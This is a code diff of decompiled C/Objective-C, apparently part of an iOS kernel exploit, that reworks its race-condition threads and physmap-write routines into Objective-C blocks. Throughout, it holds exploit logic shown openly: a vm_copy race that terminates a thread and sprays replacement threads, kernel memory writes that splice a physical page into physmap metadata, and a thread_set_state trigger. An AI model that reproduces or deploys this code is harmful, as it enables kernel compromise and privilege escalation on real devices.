@@ -118,48 +118,7 @@ typedef struct CfCollectionApplyContext
   const void *object;
 } CfCollectionApplyContext;
 
-typedef struct VmcopyRaceThreadBlock
-{
-  uint64_t isa;
-  uint64_t flags;
-  void *invoke;
-  void *descriptor;
-  __int64 *state;
-  thread_act_t *targetThread;
-  void *threadList;
-  semaphore_t readySemaphore;
-  semaphore_t resumeSemaphore;
-} VmcopyRaceThreadBlock;
-
-typedef struct VmcopyWritePhysmapBlock
-{
-  uint64_t isa;
-  uint64_t flags;
-  __int64 (__fastcall *invoke)(__int64, unsigned __int8);
-  void *descriptor;
-  __int64 ctx;
-  __int64 kaddr;
-  unsigned __int64 pteIndex;
-  unsigned __int64 pteAddr;
-  unsigned __int64 pageTableBase;
-  vm_size_t size;
-  __int64 savedNext;
-  __int64 savedPrev;
-  int pageShift;
-  mem_entry_name_port_t objectHandle;
-} VmcopyWritePhysmapBlock;
-
-typedef struct VmcopyTriggerThreadBlock
-{
-  uint64_t isa;
-  uint64_t flags;
-  void *invoke;
-  void *descriptor;
-  __int64 ctx;
-  __int64 *state;
-  semaphore_t readySemaphore;
-  semaphore_t resumeSemaphore;
-} VmcopyTriggerThreadBlock;
+typedef __int64 (^VmcopyWritePhysmapBlock)(unsigned __int8 mapTag);
 
 typedef struct VmcopyPackedMemoryEntry
 {
@@ -258,27 +217,58 @@ enum
   VMCOPY_MARKER64 = 0xC0C0C0C0C0C0C0C0ULL,
 };
 
-static inline void vmcopy_init_race_thread_block(
-        VmcopyRaceThreadBlock *block,
+static inline __int64 vmcopy_run_exploit_thread_body(
         __int64 *state,
         thread_act_t *targetThread,
-        void *threadList,
-        semaphore_t readySemaphore,
-        semaphore_t resumeSemaphore)
+        void *threadList)
 {
-  block->isa = _NSConcreteStackBlock;
-  block->flags = 3221225472LL;
-  block->invoke = run_exploit_thread;
-  block->descriptor = &unk_44870;
-  block->readySemaphore = readySemaphore;
-  block->resumeSemaphore = resumeSemaphore;
-  block->state = state;
-  block->targetThread = targetThread;
-  block->threadList = threadList;
+  __int64 result = 0;
+
+  // Paired with the main race loop: wait until the parent has primed the
+  // mapped thread object, terminate it, then refill the slot with new threads.
+  __semwait_signal();
+  while ( !*state )
+    ;
+  thread_terminate(*targetThread);
+  for ( __int64 i = 0; i != 256; i += 4 )
+    result = thread_create(mach_task_self_, (thread_act_t *)((char *)threadList + i));
+  *targetThread = 0;
+  *state = 2;
+  return result;
 }
 
-static inline void vmcopy_init_write_physmap_block(
-        VmcopyWritePhysmapBlock *block,
+static inline __int64 vmcopy_write_kaddr_to_physmap_body(
+        __int64 ctx,
+        __int64 kaddr,
+        uint64_t pteIndex,
+        uint64_t pteAddr,
+        uint64_t pageTableBase,
+        vm_size_t size,
+        int pageShift,
+        mem_entry_name_port_t objectHandle,
+        uint64_t savedNext,
+        uint64_t savedPrev,
+        unsigned __int8 mapTag)
+{
+  mem_entry_name_port_t objectHandleCopy = 0;
+
+  // Temporarily splice the chosen physical page into the physmap metadata.
+  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), kaddr, pteIndex | (pteIndex << 32));
+  __int64 pageIndex = (kaddr - pageTableBase) >> pageShift;
+  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), pteAddr + 8LL, pageIndex | (pageIndex << 32));
+  mach_make_memory_entry(
+    mach_task_self_,
+    &size,
+    0,
+    (mapTag << 24) | 0x10003,
+    &objectHandleCopy,
+    objectHandle);
+  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), pteAddr + 8LL, savedNext);
+  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), kaddr, savedPrev);
+  return mach_port_destroy(mach_task_self_, objectHandleCopy);
+}
+
+static inline VmcopyWritePhysmapBlock vmcopy_create_write_physmap_block(
         __int64 ctx,
         __int64 kaddr,
         uint64_t pteIndex,
@@ -290,37 +280,36 @@ static inline void vmcopy_init_write_physmap_block(
         uint64_t savedNext,
         uint64_t savedPrev)
 {
-  block->isa = _NSConcreteStackBlock;
-  block->flags = 3221225472LL;
-  block->invoke = write_kaddr_to_physmap;
-  block->descriptor = &unk_44890;
-  block->ctx = ctx;
-  block->kaddr = kaddr;
-  block->pteIndex = pteIndex;
-  block->pteAddr = pteAddr;
-  block->pageTableBase = pageTableBase;
-  block->size = size;
-  block->pageShift = pageShift;
-  block->objectHandle = objectHandle;
-  block->savedNext = savedNext;
-  block->savedPrev = savedPrev;
+  VmcopyWritePhysmapBlock block = ^__int64(unsigned __int8 mapTag) {
+    return vmcopy_write_kaddr_to_physmap_body(
+      ctx,
+      kaddr,
+      pteIndex,
+      pteAddr,
+      pageTableBase,
+      size,
+      pageShift,
+      objectHandle,
+      savedNext,
+      savedPrev,
+      mapTag);
+  };
+
+#if __has_feature(objc_arc)
+  return [block copy];
+#else
+  return (VmcopyWritePhysmapBlock)Block_copy(block);
+#endif
 }
 
-static inline void vmcopy_init_trigger_thread_block(
-        VmcopyTriggerThreadBlock *block,
+static inline __int64 vmcopy_trigger_thread_state_mod_body(
         __int64 ctx,
-        __int64 *state,
-        semaphore_t readySemaphore,
-        semaphore_t resumeSemaphore)
+        __int64 *state)
 {
-  block->isa = _NSConcreteStackBlock;
-  block->flags = 3221225472LL;
-  block->invoke = trigger_thread_state_mod;
-  block->descriptor = &unk_448B0;
-  block->readySemaphore = readySemaphore;
-  block->resumeSemaphore = resumeSemaphore;
-  block->ctx = ctx;
-  block->state = state;
+  __semwait_signal();
+  while ( !*state )
+    ;
+  return thread_set_state(*(uint32_t *)(ctx + 672), 6, (thread_state_t)(ctx + 384), 0x44u);
 }
 
 static inline uint32_t vmcopy_find_thread_policy_offset(
@@ -556,7 +545,7 @@ static inline void vmcopy_prime_fake_message_pages(__int64 kreadCtx, uint64_t me
 static inline uint64_t vmcopy_run_thread_state_race(
         __int64 state,
         const __int128 savedThreadObject[19],
-        VmcopyWritePhysmapBlock *writePhysmapBlock,
+        VmcopyWritePhysmapBlock writePhysmapBlock,
         semaphore_t readySemaphore,
         semaphore_t resumeSemaphore,
         uint64_t baselineNext,
@@ -567,18 +556,19 @@ static inline uint64_t vmcopy_run_thread_state_race(
   while ( 1 )
   {
     pthread_t triggerThread = 0;
-    __int64 triggerState = 0;
-    VmcopyTriggerThreadBlock triggerThreadBlock;
+    __block __int64 triggerState = 0;
 
     memcpy(*(void **)(state + VMCOPY_MAPPED_THREAD_OBJECT_OFFSET), savedThreadObject, 0x130u);
-    vmcopy_init_trigger_thread_block(&triggerThreadBlock, state, &triggerState, readySemaphore, resumeSemaphore);
-    pthread_create(&triggerThread, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &triggerThreadBlock);
+    void (^triggerThreadBlock)(void) = ^{
+      vmcopy_trigger_thread_state_mod_body(state, &triggerState);
+    };
+    pthread_create(&triggerThread, 0, recomp_run_copied_void_block_thread, recomp_copy_void_block_thread_arg(triggerThreadBlock));
     semaphore_wait(resumeSemaphore);
     semaphore_signal(readySemaphore);
 
     uint64_t mappedThreadObject = *(uint64_t *)(state + VMCOPY_MAPPED_THREAD_OBJECT_OFFSET);
     *(uint64_t *)(mappedThreadObject + 240) = 0;
-    writePhysmapBlock->invoke((__int64)writePhysmapBlock, 8u);
+    writePhysmapBlock(8u);
 
     triggerState = 1;
     uint32_t *threadPolicyBits = (uint32_t *)(mappedThreadObject + 272);
@@ -592,7 +582,7 @@ static inline uint64_t vmcopy_run_thread_state_race(
     }
     while ( !*triggered );
 
-    writePhysmapBlock->invoke((__int64)writePhysmapBlock, 1u);
+    writePhysmapBlock(1u);
     pthread_join(triggerThread, 0);
 
     uint64_t observedNext = kread_u64_value(
@@ -810,8 +800,7 @@ static inline uint64_t vmcopy_prepare_thread_state_physmap_race(
 
   uint64_t savedEntryPage = kread_u64_value(kreadCtx, memoryEntry->pageInfoKaddr);
   uint64_t savedTargetPageNext = kread_u64_value(kreadCtx, targetPageInfo + 8);
-  vmcopy_init_write_physmap_block(
-    writePhysmapBlock,
+  *writePhysmapBlock = vmcopy_create_write_physmap_block(
     state,
     memoryEntry->pageInfoKaddr,
     targetPageRef,
@@ -8473,12 +8462,6 @@ __int64 __fastcall pack_exploit_args_buffer(
            payload);
 }
 
-//----- (00000000000111B4) ----------------------------------------------------
-__int64 __fastcall call_vtable_ptr_slot2(__int64 a1)
-{
-  return (*(__int64 (**)(void))(a1 + 16))();
-}
-
 //----- (00000000000111C0) ----------------------------------------------------
 __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
 {
@@ -8490,12 +8473,11 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   semaphore_t resumeSemaphore = 0;
   uint32_t pageShift = 0;
   natural_t suspendedThreadState[0x44]; // BYREF
-  VmcopyWritePhysmapBlock writePhysmapBlock; // BYREF
+  VmcopyWritePhysmapBlock writePhysmapBlock = nil;
   integer_t policyInfo[4]; // BYREF
-  VmcopyRaceThreadBlock raceThreadBlock; // BYREF
   pthread_t raceThread; // BYREF
-  __int64 raceState; // BYREF
-  thread_act_t targetThread = 0; // BYREF
+  __block __int64 raceState; // BYREF
+  __block thread_act_t targetThread = 0; // BYREF
   thread_act_t sprayedThread; // BYREF
   uint64_t pageInfoPayload[VMCOPY_PAGE_INFO_PAYLOAD_WORDS]; // BYREF
   VmcopyTargetThreadMapping targetMapping; // BYREF
@@ -8550,8 +8532,11 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
 
     raceState = 0;
     memset(capturedThreadSlots, 0, sizeof(capturedThreadSlots));
-    vmcopy_init_race_thread_block(&raceThreadBlock, &raceState, &targetThread, capturedThreadSlots, resumeSemaphore, readySemaphore);
-    pthread_create(&raceThread, 0, (void *(__cdecl *)(void *))call_vtable_ptr_slot2, &raceThreadBlock);
+    void *capturedThreadList = capturedThreadSlots;
+    void (^raceThreadBlock)(void) = ^{
+      vmcopy_run_exploit_thread_body(&raceState, &targetThread, capturedThreadList);
+    };
+    pthread_create(&raceThread, 0, recomp_run_copied_void_block_thread, recomp_copy_void_block_thread_arg(raceThreadBlock));
     semaphore_wait(readySemaphore);
 
     uint64_t raceThreadKaddr = vmcopy_set_low_priority_and_find_policy_offset(*kreadCtxSlot, raceThread, policyInfo, &policyOffset);
@@ -8617,13 +8602,15 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
     uint64_t capturedSnapshot = vmcopy_run_thread_state_race(
                                   someStruct,
                                   savedThreadObject,
-                                  &writePhysmapBlock,
+                                  writePhysmapBlock,
                                   resumeSemaphore,
                                   readySemaphore,
                                   baselineNext,
                                   replacementNext,
                                   originalNext,
                                   targetThreadKaddr);
+    recomp_release_block(writePhysmapBlock);
+    writePhysmapBlock = nil;
     memcpy(exceptionSnapshot, (const void *)capturedSnapshot, VMCOPY_THREAD_OBJECT_SNAPSHOT_BYTES);
     vmcopy_receive_captured_thread_exception(someStruct, exceptionSnapshot);
     vmcopy_install_final_fake_thread_object(
@@ -8644,68 +8631,6 @@ __int64 __fastcall exploit_thread_vmcopy_race(__int64 someStruct)
   while ( raceStatus == VMCOPY_RACE_RETRY );
   return 0;
 }
-
-//----- (00000000000125E4) ----------------------------------------------------
-__int64 __fastcall run_exploit_thread(__int64 a1)
-{
-  VmcopyRaceThreadBlock *block = (VmcopyRaceThreadBlock *)a1;
-  __int64 result = 0;
-
-  // Paired with the main race loop: wait until the parent has primed the
-  // mapped thread object, terminate it, then refill the slot with new threads.
-  __semwait_signal();
-  while ( !*block->state )
-    ;
-  thread_terminate(*block->targetThread);
-  for ( __int64 i = 0; i != 256; i += 4 )
-    result = thread_create(mach_task_self_, (thread_act_t *)((char *)block->threadList + i));
-  *block->targetThread = 0;
-  *block->state = 2;
-  return result;
-}
-
-//----- (0000000000012678) ----------------------------------------------------
-__int64 __fastcall write_kaddr_to_physmap(__int64 a1, unsigned __int8 a2)
-{
-  VmcopyWritePhysmapBlock *block = (VmcopyWritePhysmapBlock *)a1;
-  __int64 ctx; // x21
-  __int64 pageIndex; // x8
-  mem_entry_name_port_t object_handle; // [xsp+Ch] [xbp-24h] BYREF
-
-  object_handle = 0;
-  ctx = block->ctx;
-
-  // Temporarily splice the chosen physical page into the physmap metadata.
-  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), block->kaddr, block->pteIndex | (block->pteIndex << 32));
-  pageIndex = (block->kaddr - block->pageTableBase) >> block->pageShift;
-  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), block->pteAddr + 8LL, pageIndex | (pageIndex << 32));
-  mach_make_memory_entry(
-    mach_task_self_,
-    &block->size,
-    0,
-    (a2 << 24) | 0x10003,
-    &object_handle,
-    block->objectHandle);
-  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), block->pteAddr + 8LL, block->savedNext);
-  kwrite_u64_to_addr(*(uint64_t *)(ctx + 8), block->kaddr, block->savedPrev);
-  return mach_port_destroy(mach_task_self_, object_handle);
-}
-
-//----- (0000000000012754) ----------------------------------------------------
-__int64 __fastcall trigger_thread_state_mod(__int64 a1)
-{
-  VmcopyTriggerThreadBlock *block = (VmcopyTriggerThreadBlock *)a1;
-  __int64 ctx; // x20
-  thread_act_t targetThread; // w0
-
-  ctx = block->ctx;
-  __semwait_signal();
-  while ( !*block->state )
-    ;
-  targetThread = *(uint32_t *)(ctx + 672);
-  return thread_set_state(targetThread, 6, (thread_state_t)(ctx + 384), 0x44u);
-}
-// 127B0: variable 'vars8' is possibly undefined
 
 //----- (00000000000127C0) ----------------------------------------------------
 __int64 __fastcall get_ppnum_via_kread(__int64 a1)
